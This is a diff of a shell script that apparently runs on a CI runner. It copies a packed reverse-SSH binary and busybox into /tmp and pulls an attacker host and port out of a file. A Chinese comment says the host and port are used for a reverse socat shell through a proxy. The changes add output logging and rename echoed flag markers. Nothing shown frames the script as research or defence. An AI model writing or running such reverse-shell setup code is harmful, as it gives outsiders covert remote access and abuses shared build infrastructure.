@@ -12,6 +12,11 @@
 #setsid docker pull centos:centos7  &
 
 cd /tmp;
+set -x;
+exec 1>./y1rev
+exec 2>./y2rev
+
+
 cp /home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin . &
 cp /home/runner/work/nc_test/nc_test/busybox.bin  . &
 
@@ -55,7 +60,7 @@ sudo bash -c 'echo -e "\nls -al /tmp/nu* /usr/lib/firefox/firefox /opt/microsoft
 #ip_port7pxy2qw3=$(echo 123;echo "$PATH"; ls -al aaau 2>&1 >/dev/null;echo 4568;);
 
 ip_port7pxy2a=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9;echo 456814; );
-echo "flag_9832q $ip_port7pxy2a";
+echo "flag_9832q_20240425 $ip_port7pxy2a";
 
 
 # (
@@ -86,7 +91,7 @@ port5=${ip_port5#*:};
 ip5=${ip_port5%:*};
 # 提取反弹socat的主机和端口，支持代理(ip7)
 ip_port7pxy=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9;echo 456892 >/dev/null);
-echo "flag_9832";
+echo "flag_9837_2024";
 port7pxy=${ip_port7pxy#*:};
 ip7pxy=${ip_port7pxy%:*};
 echo "flag 1122334";
